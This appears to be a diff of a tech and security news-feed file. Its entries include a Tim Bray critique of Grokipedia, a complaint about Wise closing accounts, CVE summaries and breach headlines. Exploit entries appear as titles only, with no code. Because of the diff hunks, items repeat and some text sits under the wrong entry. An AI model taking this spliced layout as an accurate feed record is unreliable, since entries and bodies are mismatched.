+inactive buffer becomes active, and vice versa.This combination of efficient shader calculations and the ping-pong technique allows us to render the particle system.If you have any comments, please leave them on this GitHub discussions topic. Sooner or later, I will integrate it with the blog. The  discussion can be found here.]]></content:encoded></item><item><title>S.A.R.C.A.S.M: Slightly Annoying Rubik&apos;s Cube Automatic Solving Machine</title><link>https://github.com/vindar/SARCASM</link><author>chris_overseas</author><category>dev</category><pubDate>Fri, 31 Oct 2025 23:03:18 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Tim Bray on Grokipedia</title><link>https://www.tbray.org/ongoing/When/202x/2025/10/28/Grokipedia</link><author>Bogdanp</author><category>dev</category><pubDate>Fri, 31 Oct 2025 21:41:53 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Last night I had a very strange experience: About two thirds of the way through reading a Web page about myself, Tim Bray, I
+    succumbed to boredom and killed the tab. Thus my introduction to
+    Grokipedia. Here are early impressions. · 
+    My Grokipedia entry has over seven thousand words, compared to a mere 1,300 in
+    my Wikipedia article. It’s pretty clear how it was generated; an LLM, trained
+    on who-knows-what but definitely including that Wikipedia article and this blog, was told to go nuts.Speaking as a leading but highly biased expert on the subject of T. Bray, here are the key take-aways: · 
+    It covers all the territory; there is no phase of my life’s activity that could possibly be encountered in combing the Web
+    that is not exhaustively covered. In theory this should be good but in fact, who cares about the details of what I worked on
+    at Sun Microsystems between 2004 and 2010? I suppose I should but, like I said, I couldn’t force myself to plod all the way
+    through it. · 
+    Every paragraph contains significant errors. Sometimes the text is explicitly self-contradictory on the face of it,
+    sometimes the mistakes are subtle enough that only I would spot them. · 
+    The writing has that LLM view-from-nowhere flat-affect semi-academic flavor. I don’t like it but the evidence suggests that
+    some people do? · 
+    All the references are just URLs and at least some of them entirely fail to support the text. Here’s an example. In
+    discussion of my expert-witness work for the FTC in their litigation against Meta concerning its acquisitions of Instagram and
+    WhatsApp, Grokipedia says:[Bray] opined that users' perceptions of response times in online services critically influence market
+    dynamics.Anyhow, I (so that you won’t have to) spent a solid fifteen minutes spelunking back and forth through that FTC doc, looking
+    for strings like “response time” and “latency” and so on. Maybe somewhere in those pages there’s support for the claim quoted
+    above, but I couldn’t find it. · 
+    Wikipedia, in my mind, has two main purposes: A quick visit to find out the basics about some city or person or plant or
+    whatever, or a deep-dive to find out what we  know about genetic linkages to autism or Bach’s relationship with
+    Frederick the Great or whatever.At the moment, Grokipedia doesn’t really serve either purpose very well. But, after all, this is release 0.1, maybe we
+    should give it a chance. · 
+    The whole point, one gathers, is to provide an antidote to Wikipedia’s alleged woke bias. So I dug into that. Let’s consider
+    three examples of what I found.  First, from that same paragraph about the FTC opinion quoted above:While Bray and aligned progressives contend that such dominance stifles innovation by enabling predatory acquisitions and
+      reduced rivalry—evidenced by fewer startup exits in concentrated sectors—counterarguments highlight that Big Tech's scale has
+      fueled empirical gains, with these firms investing over $240 billion in U.S. R&D in 2024 (more than a quarter of national
+      totals) and driving AI, cloud, and patent surges.[128]
+      [131] Six tech industries alone accounted for
+      over one-third of 
+      U.S. GDP growth from 2012–2021, comprising about 9% of the 
+      economy and sustaining 9.3 million jobs amid falling consumer prices and rapid technological diffusion.
+      [132] 
+      [133]
+      Right-leaning economists often defend consumer welfare metrics and market self-correction, warning that forced divestitures
+      risk eroding the efficiencies and investment incentives that have propelled sector productivity above 6% annual growth in key
+      areas like durable manufacturing tech.
+      [134]
+      [135]I’ve linked the numbered citations to the indicated URLs. Maybe visit one or two of them and see what you think? Four are
+    to articles arguing, basically, that monopolies must be OK because the companies accused of it are growing really fast and
+    driving the economy. They seem mostly to be from right-wing think-tanks but I guess that’s what those think-tanks are for.  One
+    of them, #131, Big Tech and the US Digital-Military-Industrial Complex, I think isn’t helpful to the argument at
+    all. But still, it’s broadly doing what they advertise: Pushing back against “woke” positions, in this case the position that
+    monopolization is bad.I looked at a couple of other examples.  For example, this is from the header of the Greta Thunberg article:While credited with elevating youth engagement on environmental issues, Thunberg's promotion of urgent, existential climate
+      threats has drawn scrutiny for diverging from nuanced empirical assessments of climate risks and adaptation capacities, as
+      well as for extending her activism into broader political arenas such as anti-capitalist and geopolitical protests.[5][6]Somehow I feel no urge to click on those citation links.If Ms Thunberg is out there on the “woke” end of the spectrum, let’s flit over to the other end, namely the entry for
+    J.D. Vance, on the subject of his book .Critics from progressive outlets, including Sarah Smarsh in her 2018 book , faulted the memoir for
+      overemphasizing personal and cultural failings at the expense of structural economic policies, arguing it perpetuated
+      stereotypes of rural whites as self-sabotaging.[71] These objections, often rooted in institutional analyses from academia and
+      media, overlooked data on behavioral patterns like opioid dependency rates—peaking at 21.5 deaths per 100,000 in Appalachia
+      around 2016—that aligned with Vance's observations of "deaths of despair" precursors.[72]I read and enjoyed  but the citation is to a  article that doesn’t mention
+    Smarsh. As for the second sentence… my first reaction as I trudged through its many clauses, was “life’s too short”.
+    But seriously, opioid-death statistics weaken the hypothesis about structural economic issues? Don’t get it. · 
+    Wikipedia is,
+    to quote myself, the encyclopedia that “anyone who’s willing to
+    provide citations can edit”.
+    Grokipedia is “the encyclopedia that Elon Musk’s LLM can edit, with sketchy citations and no progressive argument left
+    un-attacked.”So I guess it’s Working As Intended?]]></content:encoded></item><item><title>Friday Squid Blogging: Giant Squid at the Smithsonian</title><link>https://www.schneier.com/blog/archives/2025/10/friday-squid-blogging-giant-squid-at-the-smithsonian.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 31 Oct 2025 21:06:18 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[I can’t believe that I haven’t yet posted this picture of a giant squid at the Smithsonian.As usual, you can also use this squid post to talk about the security stories in the news that I haven’t covered.]]></content:encoded></item><item><title>Two Windows vulnerabilities, one a 0-day, are under active exploitation</title><link>https://arstechnica.com/security/2025/10/two-windows-vulnerabilities-one-a-0-day-are-under-active-exploitation/</link><author></author><category>security</category><pubDate>Fri, 31 Oct 2025 21:03:56 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Two Windows vulnerabilities, one a 0-day, are under active exploitation
             Two Windows vulnerabilities—one a zero-day that has been known to attackers since 2017 and the other a critical flaw that Microsoft initially tried and failed to patch recently—are under active exploi ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Windows 11 tests shared Bluetooth audio support, but only for AI PCs</title><link>https://www.bleepingcomputer.com/news/microsoft/windows-11-tests-shared-bluetooth-audio-support-but-only-for-ai-pcs/</link><author>Mayank Parmar</author><category>security</category><pubDate>Fri, 31 Oct 2025 20:59:02 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[If you have two headphones, speakers, earbuds, or any other Bluetooth hardware, you can now use both simultaneously on a Copilot+ PC. [...]]]></content:encoded></item><item><title>A theoretical way to circumvent Android developer verification</title><link>https://enaix.github.io/2025/10/30/developer-verification.html</link><author>sleirsgoevy</author><category>dev</category><pubDate>Fri, 31 Oct 2025 20:20:42 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2025-64348 - ELOG configuration file authorization bypass</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64348</link><author></author><category>vulns</category><pubDate>Fri, 31 Oct 2025 19:15:51 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64348
  Oct. 31, 2025, 7:15 p.m. | 1 day, 17 hours ago
 ELOG allows an authenticated user to modify or overwrite the configuration file, resulting in denial of service. If the execute facility is specifically enabled with the "-x" command line flag, attackers could execute OS commands on the host machine. By default, ELOG is not configured to allow shell commands or self-registration.
@@ -1592,7 +1652,7 @@ A vulnerability allowing remote code execution (RCE) on the Backup Server by an 
  8.8 | HIGH
 
 Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>Kimi Linear: An Expressive, Efficient Attention Architecture</title><link>https://github.com/MoonshotAI/Kimi-Linear</link><author>blackcat201</author><category>dev</category><pubDate>Fri, 31 Oct 2025 00:07:36 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Progress Patches High-Severity Vulnerability in MOVEit Transfer AS2 Module (CVE-2025-10932)</title><link>https://securityonline.info/progress-patches-high-severity-vulnerability-in-moveit-transfer-as2-module-cve-2025-10932/</link><author></author><category>security</category><pubDate>Fri, 31 Oct 2025 00:01:04 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Progress Patches High-Severity Vulnerability in MOVEit Transfer AS2 Module (CVE-2025-10932)]]></content:encoded></item><item><title>[webapps] Flowise 3.0.4 - Remote Code Execution (RCE)</title><link>https://www.exploit-db.com/exploits/52440</link><author></author><category>vulns</category><pubDate>Fri, 31 Oct 2025 00:00:00 +0000</pubDate><source url="https://www.exploit-db.com/">Exploit-DB</source><content:encoded><![CDATA[Flowise 3.0.4 - Remote Code Execution (RCE)]]></content:encoded></item><item><title>Leaker reveals which Pixels are vulnerable to Cellebrite phone hacking</title><link>https://arstechnica.com/gadgets/2025/10/leaker-reveals-which-pixels-are-vulnerable-to-cellebrite-phone-hacking/</link><author>akyuu</author><category>dev</category><pubDate>Thu, 30 Oct 2025 23:12:10 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>A change of address led to our Wise accounts being shut down</title><link>https://shaun.nz/why-were-never-using-wise-again-a-cautionary-tale-from-a-business-burned/</link><author>jemmyw</author><category>dev</category><pubDate>Thu, 30 Oct 2025 22:41:50 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[For years, one of my businesses has been a regular user of  (formerly TransferWise). Wise is a financial service that lets you send and receive money across currencies, often at a better rate and lower fee than traditional banks. Sounds great, right?This is our story – a sobering, frustrating, and frankly  experience that ended with our business and personal accounts being shut down, without any meaningful reason, support, or recourse.And all we did? We .🏢 A Routine Change Turned NightmareLike many businesses, we recently moved into a new office. Alongside the usual updates to suppliers and records, we updated our  with Wise. Not long after, we received an email requesting us to  the new address.Fair enough – we had no problem with that.Wise provided a dropdown list of acceptable documents: a lease agreement, rates notice, tax document, utilities bill, or telecommunications bill. Due to our company structure, most of those documents are in the name of our parent company or show our PO Box (which NZ Post requires, since they won’t deliver to our street address). But we had a  that ticked every box:Correct physical street address ✅Even detailed our fibre connection at the new premises ✅So we uploaded it – and assumed that would be the end of it.📞 The Call That Made No SenseDays later, we received an email: our document was . No clear reason. So, I called Wise and explained the situation to the customer service representative.Her response left me stunned.“The document was rejected because it was a , not a .”I paused, trying to process this. I politely explained that in New Zealand, a “tax invoice” is a legal form of a bill – even down to the name “tax invoice” being a legal requirement by IRD, and that’s how telecommunications companies issue invoices here. But she refused to accept it.“It needs to say  at the top,” she insisted.“A tax invoice isn’t acceptable.”This is simply , and completely out of touch with New Zealand’s business documentation standards. The rep wouldn’t budge.🧠 The “Solution” That Was Beyond BeliefStill trying to find a solution, I asked: what do you recommend I do then?“You should find a local shared workspace, lease a desk under your company name, change your registered office to that address, and use that lease document to verify your address with us.”Yes, you read that right.Wise’s advice was to artificially lease a desk we didn’t need, change our registered address, and use that document – just to verify an address we actually operate from.I asked to speak to a manager. That request was . She told me, flatly:“I  providing you with the correct information.”A bit more back and forth… then the call .📞 A Glimmer of Hope – Then The Hammer FallsLater that day, I received a call back from Wise – not from a manager (because apparently, Wise doesn’t have managers), but from a more “senior” representative.This rep was  and agreed the document should have been acceptable. She escalated the issue, resubmitted the document herself, and said she’d personally follow up if it was rejected again.🚫 “We’ve Restricted Your Account”I woke to an email with a stunning subject line:“We’ve restricted your account”Just like that, our  was locked. No warning. No reason. No discussion.We could no longer send or receive money, use our Wise cards, or even contact support. The email stated:“Due to our current risk policies, your account will be closed in a few months. You will not be able to use support channels.”Even worse? My  was locked too. The same personal account which did have its address fully verified, by a rates invoice for my personal address.🧾 An “Appeal” That Wasn’t an AppealThe email offered an option to . Naturally, I did.The appeal process asked for our articles of incorporation and . No problem.Then it asked us to provide our preferred currency, and bank account details to refund the balances.Wait… I thought this was an appeal? A chance to discuss and resolve the issue?That was the end. There was no opportunity to explain anything, no communication, no questions asked. The decision was made, and we were , permanently.To summarise the absurdity of this:We moved office, and updated our address with WiseWe provided a legal, NZ-compliant  showing our entity and addressIt was rejected because it was labelled a “Tax Invoice”A rep told us to lease a coworking desk elsewhere just to get a different documentA senior rep agreed we were right, and escalated itThen our accounts were shut down – with no explanation or recourseEven trying to call support now gets an automated message: “Because your account is restricted, we cannot connect you.”⚠️ Our Final Word: Be Very, Very CarefulWe had used Wise for . Regular monthly supplier payments. International stock orders. Five-figure transactions. Never a problem – until this. A minor change triggered a totally flawed process that , with no transparency or logical path to resolution.We’re not alone – a quick search shows many others facing similar horror stories with Wise.So this is my word of warning:💡 Don’t put all your eggs in the Wise basket.If you’re a business, don’t rely on them as your sole means of transferring funds. For us, it’s back to traditional banks – slower, yes, but at least they have humans you can talk to, and actual escalation paths.🧾 28th October update on our Wise debacle – it gets worse.Following the so-called “appeal” (which gave us no option to provide any information), we received the unsurprising outcome: Wise has decided to  as we had breached their acceptable use policy. 🤨What was surprising, however, was the  they gave after I queried what was breached in Wise’s Acceptable Use Policy:I was told my  was being closed for allegedly breaching their Acceptable Use Policy — specifically, section 1.4.e, which states “you may not use your personal Wise account to receive business payments.”I’ve  used my personal account for business transactions — in fact, over 99% of transfers were to overseas family members. When I asked for clarification or examples, I got none. Just a vague statement and the very strange line:“Just because we can’t offer you our services going forward doesn’t mean that we think your business activities are illegal or illegitimate — it just means that we don’t support those types of activities.”What activities?! Again, To make matters worse — our business account’s refund transfer . Why? Because it requires documentation — the  Wise previously rejected for address verification, claiming a telecommunications tax invoice isn’t a bill.After a few days, the transfer was then cancelled as of course, Wise was unable to “verify” us.So now our , their support ticket is marked “final response,” and our attempts to get clarity have gone nowhere. We’ve escalated the issue to Financial Services Complaints Ltd, Wise’s dispute resolution provider in New Zealand.Funds stuck. No clear reason. No accountability. Wise still gets a 0/10 from us.This isn’t just poor service — it’s unacceptable.Think twice before trusting Wise with your money.]]></content:encoded></item><item><title>CVE-2025-34298 - Nagios Log Server &lt; 2024R1.3.2 Set Email Privilege Escalation</title><link>https://cvefeed.io/vuln/detail/CVE-2025-34298</link><author></author><category>vulns</category><pubDate>Thu, 30 Oct 2025 22:15:49 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-34298
+]]></content:encoded></item><item><title>Kimi Linear: An Expressive, Efficient Attention Architecture</title><link>https://github.com/MoonshotAI/Kimi-Linear</link><author>blackcat201</author><category>dev</category><pubDate>Fri, 31 Oct 2025 00:07:36 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Progress Patches High-Severity Vulnerability in MOVEit Transfer AS2 Module (CVE-2025-10932)</title><link>https://securityonline.info/progress-patches-high-severity-vulnerability-in-moveit-transfer-as2-module-cve-2025-10932/</link><author></author><category>security</category><pubDate>Fri, 31 Oct 2025 00:01:04 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Progress Patches High-Severity Vulnerability in MOVEit Transfer AS2 Module (CVE-2025-10932)]]></content:encoded></item><item><title>[webapps] Flowise 3.0.4 - Remote Code Execution (RCE)</title><link>https://www.exploit-db.com/exploits/52440</link><author></author><category>vulns</category><pubDate>Fri, 31 Oct 2025 00:00:00 +0000</pubDate><source url="https://www.exploit-db.com/">Exploit-DB</source><content:encoded><![CDATA[Flowise 3.0.4 - Remote Code Execution (RCE)]]></content:encoded></item><item><title>Leaker reveals which Pixels are vulnerable to Cellebrite phone hacking</title><link>https://arstechnica.com/gadgets/2025/10/leaker-reveals-which-pixels-are-vulnerable-to-cellebrite-phone-hacking/</link><author>akyuu</author><category>dev</category><pubDate>Thu, 30 Oct 2025 23:12:10 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>A change of address led to our Wise accounts being shut down</title><link>https://shaun.nz/why-were-never-using-wise-again-a-cautionary-tale-from-a-business-burned/</link><author>jemmyw</author><category>dev</category><pubDate>Thu, 30 Oct 2025 22:41:50 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2025-34298 - Nagios Log Server &lt; 2024R1.3.2 Set Email Privilege Escalation</title><link>https://cvefeed.io/vuln/detail/CVE-2025-34298</link><author></author><category>vulns</category><pubDate>Thu, 30 Oct 2025 22:15:49 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-34298
  Oct. 30, 2025, 10:15 p.m. | 21 hours, 34 minutes ago
 Nagios Log Server versions prior to 2024R1.3.2 contain a privilege escalation vulnerability in the account email-change workflow. A user could set their own email to an invalid value and, due to insufficient validation and authorization checks tied to email identity state, trigger inconsistent account state that granted elevated privileges or bypassed intended access controls.
  8.7 | HIGH
@@ -2166,8 +2226,8 @@ IBM Tivoli Monitoring 6.3.0.7 through 6.3.0.7 Service Pack 21 could allow a remo
 
 Visit the link for more details, such as CVSS details, affected products, timeline, and more...
 ]]></content:encoded></item><item><title>Suspected Chinese snoops weaponize unpatched Windows flaw to spy on European diplomats</title><link>https://go.theregister.com/feed/www.theregister.com/2025/10/30/suspected_chinese_snoops_abuse_unpatched/</link><author></author><category>security</category><pubDate>Thu, 30 Oct 2025 19:20:13 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Suspected Chinese snoops weaponize unpatched Windows flaw to spy on European diplomats
-            Cyber spies linked to the Chinese government exploited a Windows shortcut vulnerability disclosed in March – but that Microsoft hasn't fixed yet – to target European diplomats in an effort to steal de ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Major telecom services provider Ribbon breached by state hackers</title><link>https://www.bleepingcomputer.com/news/security/major-telecom-services-provider-ribbon-breached-by-state-hackers/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Thu, 30 Oct 2025 19:03:37 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Ribbon Communications, a provider of telecommunications services to the U.S. government and telecom companies worldwide, revealed that nation-state hackers breached its IT network as early as December 2024. [...]]]></content:encoded></item><item><title>Minecraft HDL, an HDL for Redstone</title><link>https://github.com/itsfrank/MinecraftHDL</link><author>sleepingreset</author><category>dev</category><pubDate>Thu, 30 Oct 2025 18:59:02 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>BPO giant Conduent confirms data breach impacts 10.5 million people</title><link>https://www.bleepingcomputer.com/news/security/bpo-giant-conduent-confirms-data-breach-impacts-105-million-people/</link><author>Bill Toulas</author><category>security</category><pubDate>Thu, 30 Oct 2025 18:38:45 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[American business services giant Conduent has confirmed that a 2024 data breach has impacted over 10.5 million people, according to notifications filed with the US Attorney General's offices. [...]]]></content:encoded></item><item><title>I have released a 69.0MB version of Windows 7 x86</title><link>https://twitter.com/XenoPanther/status/1983477707968291075</link><author>rvnx</author><category>dev</category><pubDate>Thu, 30 Oct 2025 18:05:39 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>WhatsApp adds passwordless chat backups on iOS and Android</title><link>https://www.bleepingcomputer.com/news/security/whatsapp-adds-passwordless-chat-backups-on-ios-and-android/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Thu, 30 Oct 2025 18:02:49 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[WhatsApp is rolling out passkey-encrypted backups for iOS and Android devices, enabling users to encrypt their chat history using their fingerprint, face, or a screen lock code. [...]]]></content:encoded></item><item><title>Revealed: Afghan data breach after MoD official left laptop open on train</title><link>https://databreaches.net/2025/10/30/revealed-afghan-data-breach-after-mod-official-left-laptop-open-on-train/?pk_campaign=feed&amp;pk_kwd=revealed-afghan-data-breach-after-mod-official-left-laptop-open-on-train</link><author>Dissent</author><category>databreach</category><pubDate>Thu, 30 Oct 2025 17:52:53 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Here’s what you missed on Office Hours: October 2025</title><link>https://redcanary.com/blog/security-operations/office-hours-october-2025/</link><author></author><category>security</category><pubDate>Thu, 30 Oct 2025 17:52:08 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
-            Every Tuesday at 1 PM ET, Red Canary’s security experts tackle cybersecurity news and industry trends with special guests and exclusive operational insights.October’s episodes touched on how both defe ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Snowflake Loses Two More Bids to Dismiss Data Breach Plaintiffs</title><link>https://databreaches.net/2025/10/30/snowflake-loses-two-more-bids-to-dismiss-data-breach-plaintiffs/?pk_campaign=feed&amp;pk_kwd=snowflake-loses-two-more-bids-to-dismiss-data-breach-plaintiffs</link><author>Dissent</author><category>databreach</category><pubDate>Thu, 30 Oct 2025 17:49:23 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Can you break our pickle sandbox? Blog + exploit challenge inside</title><link>https://iyehuda.substack.com/p/we-may-have-finally-fixed-pythons</link><author>/u/valmarelox</author><category>netsec</category><pubDate>Thu, 30 Oct 2025 17:47:29 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>How the cochlea computes (2024)</title><link>https://www.dissonances.blog/p/the-ear-does-not-do-a-fourier-transform</link><author>izhak</author><category>dev</category><pubDate>Thu, 30 Oct 2025 17:01:20 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Let’s talk about how the cochlea computes!The hair cells on different parts of the basilar membrane wiggle back and forth at the frequency corresponding to their position on the membrane. But how do wiggling hair cells translate to electrical signals? This mechanoelectrical transduction process feels like it could be from a Dr. Seuss world: springs connected to the ends of hair cells open and close ion channels at the frequency of the vibration, which then cause neurotransmitter release. Bruno calls them “trapdoors”. Here’s a visualization:Wouldn’t it be convenient if the cochlea were doing a Fourier transform, which would fit cleanly into how we often analyze signals in engineering? But no 🙅🏻‍♀️! A Fourier transform has no explicit temporal precision, and resembles something closer to the waveforms on the right; this is not what the filters in the cochlea look like. Lewicki 2002It appears that human speech occupies a distinct time-frequency space. Some speculate that speech evolved to fill a time-frequency space that wasn’t yet occupied by other existing sounds.To drive the theory home, one that we have been hinting at since the outset: forming ecologically-relevant representations makes sense, as behavior is dependent on the environment. It appears that for audition, as well as other sensory modalities, we are doing this. This is a bit of a teaser for efficient coding, which we will get to soon.]]></content:encoded></item><item><title>Google&apos;s Built-In AI Defenses on Android Now Block 10 Billion Scam Messages a Month</title><link>https://thehackernews.com/2025/10/googles-built-in-ai-defenses-on-android.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLzNvcgKF1dzPvi41-IVyFcKKds42WP88xnqZjnxYUBHHdDLsJCHd26MwwUHs8NOi4I3-8c90rzegdXeQ283lfQiwGgy3vRZumlIEjZXf8CaVGYTgoBcAwuPArPEDJVl6eT_ioKsqdDdOsm7Vj4Bl8BLMF1xcZ5wZZa_Ga9vIcfgMVHYJLxEtK5stcFYHq/s1600/android-spam.jpg" length="" type=""/><pubDate>Thu, 30 Oct 2025 17:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Google on Thursday revealed that the scam defenses built into Android safeguard users around the world from more than 10 billion suspected malicious calls and messages every month.
+            Cyber spies linked to the Chinese government exploited a Windows shortcut vulnerability disclosed in March – but that Microsoft hasn't fixed yet – to target European diplomats in an effort to steal de ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Major telecom services provider Ribbon breached by state hackers</title><link>https://www.bleepingcomputer.com/news/security/major-telecom-services-provider-ribbon-breached-by-state-hackers/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Thu, 30 Oct 2025 19:03:37 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Ribbon Communications, a provider of telecommunications services to the U.S. government and telecom companies worldwide, revealed that nation-state hackers breached its IT network as early as December 2024. [...]]]></content:encoded></item><item><title>BPO giant Conduent confirms data breach impacts 10.5 million people</title><link>https://www.bleepingcomputer.com/news/security/bpo-giant-conduent-confirms-data-breach-impacts-105-million-people/</link><author>Bill Toulas</author><category>security</category><pubDate>Thu, 30 Oct 2025 18:38:45 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[American business services giant Conduent has confirmed that a 2024 data breach has impacted over 10.5 million people, according to notifications filed with the US Attorney General's offices. [...]]]></content:encoded></item><item><title>WhatsApp adds passwordless chat backups on iOS and Android</title><link>https://www.bleepingcomputer.com/news/security/whatsapp-adds-passwordless-chat-backups-on-ios-and-android/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Thu, 30 Oct 2025 18:02:49 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[WhatsApp is rolling out passkey-encrypted backups for iOS and Android devices, enabling users to encrypt their chat history using their fingerprint, face, or a screen lock code. [...]]]></content:encoded></item><item><title>Revealed: Afghan data breach after MoD official left laptop open on train</title><link>https://databreaches.net/2025/10/30/revealed-afghan-data-breach-after-mod-official-left-laptop-open-on-train/?pk_campaign=feed&amp;pk_kwd=revealed-afghan-data-breach-after-mod-official-left-laptop-open-on-train</link><author>Dissent</author><category>databreach</category><pubDate>Thu, 30 Oct 2025 17:52:53 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Here’s what you missed on Office Hours: October 2025</title><link>https://redcanary.com/blog/security-operations/office-hours-october-2025/</link><author></author><category>security</category><pubDate>Thu, 30 Oct 2025 17:52:08 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
+            Every Tuesday at 1 PM ET, Red Canary’s security experts tackle cybersecurity news and industry trends with special guests and exclusive operational insights.October’s episodes touched on how both defe ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Snowflake Loses Two More Bids to Dismiss Data Breach Plaintiffs</title><link>https://databreaches.net/2025/10/30/snowflake-loses-two-more-bids-to-dismiss-data-breach-plaintiffs/?pk_campaign=feed&amp;pk_kwd=snowflake-loses-two-more-bids-to-dismiss-data-breach-plaintiffs</link><author>Dissent</author><category>databreach</category><pubDate>Thu, 30 Oct 2025 17:49:23 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Can you break our pickle sandbox? Blog + exploit challenge inside</title><link>https://iyehuda.substack.com/p/we-may-have-finally-fixed-pythons</link><author>/u/valmarelox</author><category>netsec</category><pubDate>Thu, 30 Oct 2025 17:47:29 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Google&apos;s Built-In AI Defenses on Android Now Block 10 Billion Scam Messages a Month</title><link>https://thehackernews.com/2025/10/googles-built-in-ai-defenses-on-android.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLzNvcgKF1dzPvi41-IVyFcKKds42WP88xnqZjnxYUBHHdDLsJCHd26MwwUHs8NOi4I3-8c90rzegdXeQ283lfQiwGgy3vRZumlIEjZXf8CaVGYTgoBcAwuPArPEDJVl6eT_ioKsqdDdOsm7Vj4Bl8BLMF1xcZ5wZZa_Ga9vIcfgMVHYJLxEtK5stcFYHq/s1600/android-spam.jpg" length="" type=""/><pubDate>Thu, 30 Oct 2025 17:00:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Google on Thursday revealed that the scam defenses built into Android safeguard users around the world from more than 10 billion suspected malicious calls and messages every month.
 The tech giant also said it has blocked over 100 million suspicious numbers from using Rich Communication Services (RCS), an evolution of the SMS protocol, thereby preventing scams before they could even be sent.
